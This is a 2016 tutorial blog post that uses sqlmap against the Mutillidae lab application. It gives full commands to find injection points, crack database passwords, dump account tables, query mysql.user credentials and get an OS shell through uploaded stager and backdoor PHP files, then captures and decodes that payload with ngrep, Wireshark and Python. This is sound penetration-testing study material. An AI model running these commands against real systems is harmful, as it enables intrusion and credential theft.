+++
topics = []
tags = [ "infosec", "sql", "sql-injection", "sqlmap", "packet-analysis", "ngrep", "wireshark", "python", "vulnerability-scanner", "scanning"]
date = "2016-05-07T00:00:00+08:00"
title = "SQL injection with sqlmap"
draft = false
description = "os-shell access, capture and inspect the payload"
toc = true

+++

# Scan for vulnerability
## Create a HTTP request file

1. Use `-r` option instead of passing long parameters of `--url`, `--user-agent`, etc.

	**Note:** use packet capture utility such as `ngrep` to facilitate the process.

	```text
	sqlmap -r REQUESTFILE ...
	-r REQUESTFILE      Load HTTP request from a file
	```

	![sql-injection-with-sqlmap-01](/img/sql-injection-with-sqlmap-01.png)

2. Clean-up the trailing `.` (non-printable char displayed by `ngrep`), and write to a file e.g., `mutillidae-login.request`

	![sql-injection-with-sqlmap-02](/img/sql-injection-with-sqlmap-02.png)


## Scan the target
1. Launch the scan with the `-r` and use the request file created above, it will take some time:

	```bash
	$ sqlmap -r -mutillidae-login.request --batch --banner
	```

	![sql-injection-with-sqlmap-03](/img/sql-injection-with-sqlmap-03.png)

2. Once a vulnerability is found, it will print the parameter that's vulnerable, the injection type, and the payload used to carried out the injection. The following scan results indicate total of three type of injections found.
	* boolean-based blind
	* error-based
	* AND/OR time-based blind

	![sql-injection-with-sqlmap-04](/img/sql-injection-with-sqlmap-04.png)

	**Note:** the `--technique` option can be used to specifically target one type of attack.
	```text
	 --technique=BEUSTQ,
	   B=boolean-based blind, E=error-based, U=union-query-based, S=stacked queries,
	   T=time-based blind, Q=inline queries
	```

## Explore the vulnerable target's databases and system

Once entered the system:

1. Crack the passwords
```bash
$ sqlmap -r mutillidae-login.request --batch --passwords
```
	![sql-injection-with-sqlmap-05](/img/sql-injection-with-sqlmap-05.png)

2. List the databases:
```bash
$ sqlmap -r mutillidae-login.request --batch --dbs
```
	![sql-injection-with-sqlmap-06](/img/sql-injection-with-sqlmap-06.png)

3. List the tables:
```bash
$ sqlmap -r mutillidae-login.request --batch --tables -D nowasp
```
	![sql-injection-with-sqlmap-07](/img/sql-injection-with-sqlmap-07.png)

4. Dump the `nowasp.accounts` table:
	```bash
	$ sqlmap -r mutillidae-login.request --batch --dump -T accounts -D nowasp
	```
	![sql-injection-with-sqlmap-08](/img/sql-injection-with-sqlmap-08.png)

### Some other commonly used options to explore the system:
```bash
$ sqlmap -r mutillidae-login.request --current-user
$ sqlmap -r mutillidae-login.request --privileges
$ sqlmap -r mutillidae-login.request --dbms=mysql -D mysql --sql-query="select user,password from mysql.user order by user desc"
```

## OS Shell Access
**Note:** see section [Capture and decode the payload]({{< relref "#capture-and-decode-the-payload" >}}) to retrieve the payloads.
```bash
$ sqlmap -r mutillidae-login.request --batch --os-shell
```
![sql-injection-with-sqlmap-09](/img/sql-injection-with-sqlmap-09.png)

### Behind the scene
The file stager (1) `tmpuntbv.php` is first uploaded to the `/var/www/html` as explained in section [Capture and decode the payload]({{< relref "#capture-and-decode-the-payload" >}}). 

Then, the backdoor (2) `tmpbyovw.php` is uploaded to the server through `tmpuntbv.php`.

![sql-injection-with-sqlmap-14](/img/sql-injection-with-sqlmap-14.png)

All shell commands' requests are made through the backdoor script `tmpbyovw.php` to 192.168.1.9 and results are returned to the 192.168.1.11.

![sql-injection-with-sqlmap-13](/img/sql-injection-with-sqlmap-13.png)

## Speedup the process and specify custom injection payloads
To speedup the process, pass as many parameters to shorten the processing time. For examples:
```bash
-p TESTPARAMETER      Testable parameter(s)
--dbms=DBMS           Force back-end DBMS to this value
--technique=TECH      SQL injection techniques to use (default "BEUSTQ")
```


---
# Capture and decode the payload

From the sqlmap stdout, pins down the files (payloads) uploaded:

![sql-injection-with-sqlmap-10](/img/sql-injection-with-sqlmap-10.png)


## with Ngrep
```bash
$ ngrep -d eth0 -qt -W byline "^GET | ^POST" "port 80 and host 192.168.1.11"
```

Look for the files uploaded described above:
![sql-injection-with-sqlmap-11](/img/sql-injection-with-sqlmap-11.png)

## with Wireshark

Use the following filters:
```bash
Capture filter: not broadcast and not multicast and host 192.168.1.11
Display filter (1): http contains "tmpuntbv.php"
Display filter (2): http contains "tmpbyovw.php"
```

From the matching packet, `Follow` &rarr; `HTTP Stream`:

![sql-injection-with-sqlmap-12](/img/sql-injection-with-sqlmap-12.png)


## Decode the payload
Unquote the url strings with:
```python
import sys
import urlparse
import codecs
buf = urlparse.unquote(sys.argv[1])
print buf
```
produces,

![sql-injection-with-sqlmap-15](/img/sql-injection-with-sqlmap-15.png)

and decodes the hex (starting from ~~0x~~3c3f... until ...3e0a) with,

```python
payload = sys.argv[1]
print codecs.decode(payload, "hex")
```

produces,

![sql-injection-with-sqlmap-16](/img/sql-injection-with-sqlmap-16.png)

the code basically handling file uploads and also change the uploaded files permission to `0755`.
